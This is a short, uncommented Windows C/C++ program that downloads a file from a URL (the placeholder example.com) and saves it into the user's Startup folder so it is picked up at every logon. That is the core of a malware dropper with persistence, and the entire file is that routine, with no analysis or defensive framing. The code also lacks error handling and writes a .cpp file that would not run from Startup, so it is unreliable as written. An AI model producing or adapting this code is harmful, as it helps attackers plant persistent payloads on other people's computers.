
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

#define BUFFER_SIZE 4096

void DownloadFile(const char* url, const char* filename) {
    DWORD bytesRead;

    HINTERNET hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    char buffer[BUFFER_SIZE];

    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    do {
        InternetReadFile(hConnect, buffer, BUFFER_SIZE, &bytesRead);
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    } while (bytesRead > 0);

    CloseHandle(hFile);

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    char startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    const char* url = "http://example.com/file.cpp";

    char filename[MAX_PATH];
    sprintf(filename, "%s\\file.cpp", startupPath);

    DownloadFile(url, filename);

    return 0;
}
